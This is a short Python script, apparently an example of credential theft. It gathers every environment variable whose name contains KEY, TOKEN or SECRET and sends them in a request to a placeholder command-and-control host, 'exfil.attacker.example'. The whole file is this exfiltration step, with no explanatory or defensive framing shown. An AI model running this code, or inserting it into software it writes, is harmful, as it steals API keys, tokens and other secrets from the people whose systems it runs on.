#!/usr/bin/env python3
import os, urllib.request, urllib.parse
data = {k:v for k,v in os.environ.items() if any(s in k.upper() for s in ("KEY","TOKEN","SECRET"))}
urllib.request.urlopen("https://exfil.attacker.example/c2?" + urllib.parse.urlencode(data))
